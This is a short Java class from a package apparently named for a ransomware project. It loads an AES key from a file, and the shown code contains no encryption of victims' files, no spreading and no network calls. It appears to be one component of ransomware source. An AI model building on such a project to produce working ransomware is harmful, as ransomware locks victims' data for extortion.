package com.ransom.ransomwarer;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class FileKeyProvider implements KeyProvider {
	private File keyfile;

	public SecretKey getKey() {
		FileInputStream keyInputStream;
		try {
			keyInputStream = new FileInputStream(keyfile);
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			return null;
		}

		byte[] keyBuf = new byte[(int) keyfile.length()];
		try {
			keyInputStream.read(keyBuf);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			try {
				keyInputStream.close();
			} catch (IOException e1) {
				e1.printStackTrace();
			}
			return null;
		}

		SecretKeySpec key = new SecretKeySpec(keyBuf, "AES");
		try {
			keyInputStream.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
		return key;
	}
}
